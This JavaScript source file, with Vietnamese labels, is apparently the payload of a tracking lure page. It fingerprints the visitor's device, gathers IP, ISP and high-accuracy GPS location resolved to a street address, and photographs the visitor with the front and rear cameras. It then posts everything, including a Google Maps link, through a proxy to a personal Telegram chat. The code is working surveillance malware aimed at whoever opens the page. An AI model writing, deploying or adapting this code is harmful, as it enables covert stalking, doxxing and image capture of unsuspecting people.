const API_PROXY = '/api/send';

// Đã cập nhật Chat ID cá nhân của bạn vào cả 2 trường hợp
const TELEGRAM_CHAT_ID_WITH_PHOTOS = '8872446985';
const TELEGRAM_CHAT_ID_NO_PHOTOS = '8872446985';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '', 
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    if (match) {
      let model = match[1].split('/')[0].trim();
      if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
      if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
      info.device = model;
    } else {
      info.device = 'Android Device';
    }
  } 
  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } 
  else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

async function getPublicIP() {
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const data = await r.json();
    info.ip = data.ip || 'Không rõ';
  } catch (e) { info.ip = 'Bị chặn'; }
}

async function getRealIP() {
  try {
    const r = await fetch('https://icanhazip.com');
    const ip = await r.text();
    info.realIp = ip.trim();
    const res = await fetch(`https://ipwho.is/${info.realIp}`);
    const data = await res.json();
    info.isp = data.connection?.org || 'VNNIC';
    info.country = data.country || 'Việt Nam';
  } catch (e) { info.realIp = 'Lỗi kết nối'; }
}

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name || '📍 Vị trí GPS';
          info.country = data.address?.country || info.country;
        } catch {
          info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
        }
        resolve();
      },
      async () => {
        await fallbackIPLocation();
        resolve();
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

async function fallbackIPLocation() {
  try {
    const data = await fetch(`https://ipwho.is/`).then(r => r.json());
    info.lat = data.latitude?.toFixed(6) || '0';
    info.lon = data.longitude?.toFixed(6) || '0';
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
    info.country = data.country || 'Việt Nam';
  } catch (e) { info.address = 'Không rõ'; }
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    
    if (facingMode === 'user') {
      const videoElem = document.getElementById('preview');
      if (videoElem) {
        videoElem.srcObject = stream;
        videoElem.style.display = "block";
      }
      const msg = document.getElementById('msg');
      if (msg) msg.style.display = "none";
      const vBox = document.getElementById('vBox');
      if (vBox) vBox.classList.add('camera-ready');
    }

    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          resolve(canvas.toDataURL('image/jpeg', 0.6));
        }, 800);
      };
    });
  } catch (e) {
    return null;
  }
}

function getCaption() {
  const mapsLink = info.lat && info.lon
    ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
    : 'Không rõ';

  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

async function sendPhotos(frontB64, backB64) {
  const media = [];

  if (frontB64) {
    media.push({ type: 'photo', media: frontB64, caption: getCaption() });
  }
  if (backB64) {
    media.push({ type: 'photo', media: backB64 });
  }

  const payloadType = media.length === 1 ? 'photo' : 'media';

  return fetch(API_PROXY, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID_WITH_PHOTOS,
      type: payloadType,
      media: media
    })
  });
}

async function sendTextOnly() {
  return fetch(API_PROXY, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
      type: 'text',
      text: getCaption()
    })
  });
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function runTrackingSystem() {
  detectDevice();
  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

  let front = null, back = null;

  try {
    front = await captureCamera("user");
    await delay(300);
    back = await captureCamera("environment");
    
    if (front && back) info.camera = '✅ Đã chụp camera trước và sau';
    else if (front) info.camera = '✅ Chỉ chụp được camera trước';
    else info.camera = '🚫 Bị từ chối hoặc lỗi camera';
  } catch (e) {
    info.camera = '🚫 Lỗi khởi tạo Camera';
  }

  if (front || back) {
    await sendPhotos(front, back);
  } else {
    await sendTextOnly();
  }
}
